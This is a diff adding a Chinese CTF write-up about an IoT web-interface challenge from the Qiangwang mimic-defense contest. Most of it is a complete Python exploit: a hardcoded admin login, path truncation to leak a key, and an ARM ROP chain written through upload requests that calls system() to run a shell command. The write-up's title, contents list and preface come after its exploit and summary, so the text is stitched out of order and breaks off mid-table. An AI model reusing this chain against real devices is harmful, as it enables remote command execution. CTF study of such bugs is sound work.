@@ -1,0 +1,185 @@
+
+```python
+from pwn import *
+import requests
+from urllib.parse import quote_plus
+import re
+import asyncio
+mysession = None
+mysid = None
+base_url = "http://127.0.0.1:8800"
+headers = {
+"Host": "127.0.0.1:8800",
+"sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Microsoft Edge";v="140"',
+"sec-ch-ua-mobile": "?0",
+"sec-ch-ua-platform": '"macOS"',
+"Upgrade-Insecure-Requests": "1",
+"Origin": "http://127.0.0.1:8800",
+"Content-Type": "application/x-www-form-urlencoded",
+"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
+"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+"Sec-Fetch-Site": "same-origin",
+"Sec-Fetch-Mode": "navigate",
+"Sec-Fetch-User": "?1",
+"Sec-Fetch-Dest": "document",
+"Referer": "http://127.0.0.1:8800/",
+"Accept-Encoding": "gzip, deflate",
+"Accept-Language": "zh-CN,zh;q=0.9",
+"Connection": "close"
+}
+def set_session_cookies():
+if mysid:
+mysession.cookies.set("SID", mysid)
+mysession.cookies.set(
+"mitmproxy-auth",
+'2|1:0|10:1745484849|14:mitmproxy-auth|4:eQ==|'
+'bcade3a9f1b37c48d9c3d670a0d91c2524f01452c91ba02f80c059c1a5c1b0a5'
+)
+else:
+print("[-] 未设置 SID")
+exit(1)
+def send_post(url, data):
+set_session_cookies()
+resp = mysession.post(base_url + url, headers=headers, data=data)
+return resp.text
+def send_get(url, params):
+set_session_cookies()
+resp = mysession.get(base_url + url, headers=headers, params=params)
+return resp.text
+def login(username="admin", password="8g323##a08h33zx33@!B!$$$$$$$"):
+global mysession, mysid
+url = "/cgi-bin/auth.cgi"
+mysession = requests.Session()
+data = f"username={quote_plus(username)}&password={quote_plus(password)}"
+resp = mysession.post(base_url + url, headers=headers, data=data, allow_redirects=False)
+mysid = mysession.cookies.get("SID")
+if not mysid:
+print("[-] 登录失败，未获取到 SID")
+mysession = None
+return False
+print(f"[+] 登录成功，SID = {mysid}")
+return True
+def upload(data):
+return send_post("/cgi-bin/upload.cgi", data)
+def manage(params):
+return send_get("/cgi-bin/manage.cgi", params)
+def create_rootkey():
+return send_get("/cgi-bin/watch", {})
+def set_id(params):
+print("[+] setid saved: " + str(params["setid"]))
+return send_get("/cgi-bin/lang.cgi", params)
+def make_rop():
+# '''
+# 0x00015b24: pop {lr}; bx lr;
+# 0x0010c730: pop {r0, lr}; bx lr;
+# '''
+libc = 0xb6e8f000
+pop_lr = 0x00015b24 + libc
+pop_r0_lr = 0x0010c730 + libc
+system = 0x38d34 + libc
+shm_addr = 0xb6ffc000
+args_addr = shm_addr + 0x24 + 0x4 * (3 + 1)
+cmd = "cat /home/ctf/flag > /tmp/store/logs.txt"
+rop = b'a' * 0x24 + p32(pop_lr)
+rop += p32(pop_r0_lr) + p32(args_addr) + p32(system)
+rop += cmd
+rop += b'\x00'
+pk_prefix = "00" * 80
+for idx, val in enumerate(rop):
+byte_hex = f"{val:02x}"
+pk_content = pk_prefix + byte_hex * 2
+print(f"[+] set payload_store[{idx}] = 0x{byte_hex}")
+payload = {
+"action": "upload_pubkey",
+"filecontent": pk_content,
+}
+upload(payload)
+params = {
+"action": "set_publicfile",
+"cnt1": 80,
+"cnt2": idx,
+}
+manage(params)
+def redirect_flag_to_log():
+create_rootkey()
+suffix = "nik.gif"
+need_to_minus = len("/tmp/"+"rootkey") + 1
+file_path = "./" * ((0x60-need_to_minus)//2) + "/" + "rootkey" + suffix
+# print(hex((need_to_minus)))
+# print(hex(len(file_path)))
+payload = {
+"action": "download",
+"path": file_path,
+}
+rootkey = upload(payload)
+print("[+] rootkey: " + rootkey)
+payload = {
+"setid": "-1",
+}
+set_id(payload)
+make_rop()
+payload = {
+"action": "manage",
+"rk": rootkey,
+}
+manage(payload)
+def get_flag():
+payload = {
+"action": "logs",
+}
+flag = manage(payload)
+print("[+] ", flag)
+login()
+redirect_flag_to_log()
+get_flag()
+```
+
+这个脚本需要分开执行，先执行下面，同时保证`rootkey`是可见字符（如果不是，则会让最后的漏洞无法触发）
+
+```python
+login()
+redirect_flag_to_log()
+```
+
+接着执行，就可以拿到flag
+
+```python
+login()
+get_flag()
+```
+
+![](upload/attach/202510/971428_ZJDVJ2RKPNGS2PZ.png)
+
+# 总结
+
+总体来看其实难度并不算大，但逆向上会耽误一点时间，主要是对于总体的把控，比如说每一个cgi有什么功能，我怎么去触发，哪些功能有问题，并巧妙地将孤立的微小漏洞组合起来，形成一条完整的 RCE 攻击链
+
+# 第八届“强网”拟态防御国际精英挑战赛 - WIN！致敬mt 复现
+
+## 目录
+
+- [前言](https://bbs.kanxue.com/#%E5%89%8D%E8%A8%80)
+- [漏洞分析](https://bbs.kanxue.com/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)
+  - [基本信息](https://bbs.kanxue.com/#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF)
+  - [解密admin的账号密码](https://bbs.kanxue.com/#%E8%A7%A3%E5%AF%86admin%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81)
+  - [栈溢出](https://bbs.kanxue.com/#%E6%A0%88%E6%BA%A2%E5%87%BA)
+  - [目录截断](https://bbs.kanxue.com/#%E7%9B%AE%E5%BD%95%E6%88%AA%E6%96%AD)
+  - [字符逃逸](https://bbs.kanxue.com/#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8)
+  - [命令执行](https://bbs.kanxue.com/#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)
+- [exploit](https://bbs.kanxue.com/#exploit)
+- [总结](https://bbs.kanxue.com/#%E6%80%BB%E7%BB%93)
+
+## 前言
+
+拟态比赛的时候时间过于匆忙，并没有很多时间看这道题目，因此赛后进行了复现，这一过程中十分感谢@zikh26师傅和神秘的@Nik Xe大哥给予的帮助。
+
+> 为什么第二道iot还没复现，问就是c++还没逆完
+
+## 漏洞分析
+
+### 基本信息
+
+从启动脚本发现其实只开了一个80端口，我们先启动看一下基本的信息，可以发现80端口由`lighttpd`监听，启动方式为`/usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf`
+
+|  |  |
+| --- | --- |
